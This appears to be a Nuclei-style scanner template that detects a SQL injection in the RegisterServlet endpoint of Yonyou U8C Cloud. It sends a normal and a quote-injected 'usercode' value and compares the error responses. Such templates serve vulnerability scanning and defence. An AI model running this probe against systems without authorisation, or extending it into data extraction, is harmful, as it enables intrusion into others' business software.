id: yonyou-u8c-registerservlet-sqli

info:
  name: 用友U8C Cloud RegisterServlet SQL注入
  author: SleepingBag945
  severity: high
  tags: 用友-U8,用友-NC-Cloud,Yonyou-UFIDA-NC,Yonyou-U8-Cloud

http:
  - raw:
      - |
        POST /servlet/RegisterServlet HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2866.71 Safari/537.36
        Connection: close
        Accept: */*
        Accept-Language: en
        Content-Type: application/x-www-form-urlencoded
        X-Forwarded-For: 127.0.0.1

        usercode=123456

      - |
        POST /servlet/RegisterServlet HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2866.71 Safari/537.36
        Connection: close
        Accept: */*
        Accept-Language: en
        Content-Type: application/x-www-form-urlencoded
        X-Forwarded-For: 127.0.0.1

        usercode=123456'

    matchers:
      - type: dsl
        dsl:
          - status_code_2 == 200 && contains_all(body_2,'Error:') && status_code_1 == 200 && contains_all(body_1,'null') && !contains_all(body_2,'null')
